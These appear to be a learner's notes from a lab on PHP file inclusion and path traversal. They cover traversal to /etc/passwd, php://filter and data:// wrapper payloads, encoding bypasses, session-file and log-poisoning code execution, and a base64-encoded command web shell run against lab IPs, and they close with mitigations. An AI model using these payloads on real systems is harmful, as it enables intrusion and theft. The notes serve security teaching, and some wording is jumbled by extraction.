# File Inclusion, path travesal

## Introduction
- File Inclusion and Path Traversal are vulnerabilities that arise when an application allows external input to change the path for accessing files. For
example, imagine a library where the catalogue system is manipulated to access restricted books not meant for public viewing. Similarly, in web
applications, the vulnerabilities primarily arise from improper handling of file paths and URLs. These vulnerabilities allow attackers to include files
not intended to be part of the web application, leading to unauthorized access or execution of code.

- Basics of File Inclusion
A traversal string, commonly seen as ../, is used in path traversal attacks to navigate through the directory structure of a file system. It's
essentially a way to move up one directory level. Traversal strings are used to access files outside the intended directory.
For example, include('./folder/file.php') implies that file.php is located inside a folder named folder, which is in the same directory as the
executing script.

- Remote File Inclusion
Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to
external malicious files. For example, if a web application uses a URL in a GET parameter like include.php?page=
attacker can replace the URL with a path to a malicious script.
http://attacker.com/exploit.php, an Local File Inclusion

- Local File Inclusion, or LFI, typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server. Attackers
usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a
traversal string, an attacker might access sensitive files like ```include.php?page=../../../../etc/passwd```.
Relative pathing refers to locating files based on the current directory. For example, include('./folder/file.php') implies that file.php is located
inside a folder named folder, which is in the same directory as the executing script.
Absolute pathing involves specifying the complete path starting from the root directory. For example,``` /var/www/html/folder/file.php``` is an absolute path.
PHP Wrappers
PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in
PHP protocols, which may lead to significant security risks if not properly handled.
For instance, an application vulnerable to LFI might include files based on a user-supplied input without sufficient validation. In such cases,
attackers can use the ```php://filter``` filter. This filter allows a user to perform basic modification operations on the data before it's read or written.
For example, if an attacker wants to encode the contents of an included file like ```/etc/passwd``` in base64. This can be achieved by using the
convert.base64-encode conversion filter of the wrapper. The final payload will then be ```php://filter/convert.base64-encode/resource=/etc/passwd```
- There are many categories of filters in PHP. Some of these are String Filters (string.rot13, string.toupper, string.tolower, and string.strip_tags),
Conversion Filters (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode, and convert.quoted-printable-decode), Compression
Filters (zlib.deflate and zlib.inflate), and Encryption Filters (mcrypt, and mdecrypt) which is now deprecated.
Data Wrapper
- The data stream wrapper is another example of PHP's wrapper functionality. The data:// wrapper allows inline data embedding. It is used to embed small
amounts of data directly into the application code.
For example, go to 
```http://10.80.184.67/playground.php``` and use  
 - The payload
 ``` data:text/plain,<?php%20phpinfo();%20?>```. In the below image, this URL could
cause PHP code execution, displaying the PHP configuration details.
Vulnerable application containing the data payload
The breakdown of the payload ```data:text/plain,<?php phpinfo(); ?>``` is:
data: as the URL.
mime-type is set as text/plain.
The data part includes a PHP code snippet: ```<?php phpinfo(); ?>```.

## Base Directory Breakout:
In web applications, safeguards are put in place to prevent path traversal attacks. However, these defences are not always foolproof. Below is the code
of an application that insists that the filename provided by the user must begin with a predetermined base directory and will also strip out file
traversal strings to protect the application from - file traversal attacks:
Sample Code;

```javascript
function containsStr($str, $subStr){
 return strpos($str, $subStr) !== false;
}
if(isset($_GET['page'])){
 if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
 include $_GET['page'];
 }else{
 echo 'You are not allowed to go outside /var/www/html/ directory!';
 }
}
```
The PHP function containsStr checks if a substring exists within a string. The if condition checks two things. First, if ```$_GET['page']``` does not contain
1/4

- File Inclusion, Path Traversal
the substring ```../..```, and if ```$_GET['page']``` contains the substring ```/var/www/html```, however, ```..//..//``` bypasses this filter because it still effectively
navigates up two directories, similar to ```../../```. It does not exactly match the blocked pattern ```../..``` due to the extra slashes. The extra slashes ```//``` in
```..//..//``` are treated as a single slash by the file system. This means ```../../``` and ```..//..//``` are functionally equivalent in terms of directory navigation
but only ```../../``` is explicitly filtered out by the code.
### Obfuscation
Obfuscation techniques are often used to bypass basic security filters that web applications might have in place. These filters typically look for
obvious directory traversal sequences like ../. However, attackers can often evade detection by obfuscating these sequences and still navigate through
the server's filesystem.
For instance, ```../``` can be encoded or obfuscated in several ways to bypass simple filters.
Standard URL Encoding: ```../``` becomes ```%2e%2e%2f```
- Double Encoding: Useful if the application decodes inputs twice. ```../``` becomes ```%252e%252e%252f```
- Obfuscation: Attackers can use payloads like ```....//```, which help in avoiding detection by simple string matching or filtering mechanisms.
For example, imagine an application that mitigates LFI by filtering out ```../```: Sample Script
```$file = $_GET['file']```;
```$file = str_replace('../', '', $file)```;
```include('files/' . $file)```;

- An attacker can potentially bypass this filter using the following methods:
URL Encoded Bypass: The attacker can use the URL-encoded version of the payload like ```?file=%2e%2e%2fconfig.php```. The server decodes this input to
```../config.php```, bypassing the filter.

- Double Encoded Bypass: The attacker can use double encoding if the application decodes inputs twice. The payload would then be ```?file=%252e%252e%252fconfig.php```, where a dot is ```%252e```,  and a slash is ```%252f```. The first decoding step changes ```%252e%252e%252f``` to ```%2e%2e%2f```. The second
decoding step then translates it to ```../config.php```.
- Obfuscation: An attacker could use the payload ```....//config.php```, which, after the application strips out the apparent traversal string, would
effectively become ```../config.php```.

### PHP Session Files:
PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a
typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the
application includes these files through an LFI vulnerability, this can lead to code execution.
For example, the vulnerable application hosted in 
Sample Code
```http
if(isset($_GET['page'])){
 $_SESSION['page'] = $_GET['page'];
 echo "You're currently in" . $_GET["page"];
 include($_GET['page']);
}
```
- http://10.80.184.67/sessions.php contains the below code:

An attacker could exploit this vulnerability by injecting a PHP code into their session variable by using ```<?php echo phpinfo(); ?>``` in the page
parameter.
This code is then saved in the session file on the server. Subsequently, the attacker can use the LFI vulnerability to include this session file. Since
session IDs are hashed, the ID can be found in the cookies section of your browser.
Getting the value of the ```PHPSESSID```
Accessing the URL ```sessions.php?page=/var/lib/php/sessions/sess_[sessionID]``` will execute the injected PHP code in the session file. Note that you have to
replace ```[sessionID]``` with the value from your ```PHPSESSID``` cookie.

- Log Poisoning:
Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and
execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In
a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil
user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can
exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file,
leading to RCE.
For example, if an attacker sends a ```Netcat``` request to the vulnerable machine containing a PHP code:
- Sample Request
```http
$ nc 10.82.143.216 80
<?php echo phpinfo(); ?>
HTTP/1.1 400 Bad Request
Date: Thu, 23 Nov 2023 05:39:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 335
Connection: close
Content-Type: text/html; charset=iso-8859-1
2/4
```
```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.82.143.216.eu-west-1.compute.internal Port 80</address>
</body></html>
```
The code will then be logged in the server's access logs.
The attacker then uses LFI to include the access log file: ```?page=/var/log/apache2/access.log```

- Eg:
```http://10.82.143.216/playground.php?page=/var/log/apache2/access.log```

- PHP Wrappers:
PHP wrappers can also be used not only for reading files but also for code execution. The key here is the php://filter stream wrapper, which enables
file transformations on the fly. Take the PHP base64 filter as an example. This method allows attackers to execute arbitrary code on the server using a
base64-encoded payload.
For example, go to 
```http://10.82.143.216/playground.php```.
We will use the PHP code
```<?php system($_GET['cmd']); echo 'Shell done!'; ?>```
as our payload. The value of the payload, when encoded to base64, will be
```php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+```

```bash
Position    
1    
Field    
Protocol Wrapper
php://filter
2    
Filter    
Value
convert.base64-decode
3    
Resource Type
resource=
4    
Data Type
data://plain/text,
5    
Encoded Payload
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```
- In the table
Note: It is important to not include the &cmd=whoami in the input field since it will be encoded when the form is submitted. Once encoded, the backend
will treat it as part of the base64 code, giving you an invalid byte sequence error.

```
http://10.82.143.216/playground.php?page=php://filter/convert.base64
decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat%20flags/cd3c67e5079de2700af6cea0a405f9cc.txt
```
It is very important that after the payload you use & to concatenate the desired command, which in this case were
```
cmd=ls
cmd=ls-al
cmd=cat.
```
# Conclusion
File Inclusion and Path Traversal vulnerabilities arise from improper handling of user-supplied input in web applications. In File Inclusion, attackers
exploit the way web applications handle files, leading to Local File Inclusion or Remote File Inclusion. On the other hand, Path Traversal involves
navigating the server's directory structure to access files outside the intended directory. Both vulnerabilities can be used to access unauthorized data
or system compromise.

- Mitigation and Prevention Strategies:
Ensure all user inputs are properly validated and sanitized. This is a crucial step to prevent attackers from manipulating file paths or including
malicious files.
    - Implement allowlisting for file inclusion and access. Define which files can be included or accessed and reject any request that does not match these
criteria.
Configure server settings to disallow remote file inclusion and limit the ability of scripts to access the filesystem. For PHP, directives like
allow_url_fopen and allow_url_include should be disabled if not needed.
    - Performing regular code reviews and security audits to identify potential vulnerabilities with the help of automated tools. Manual checks are also
essential.
Ensure that everyone involved in the development process understands the importance of security. Regular training on secure coding practices can
significantly reduce the risk of this vulnerability.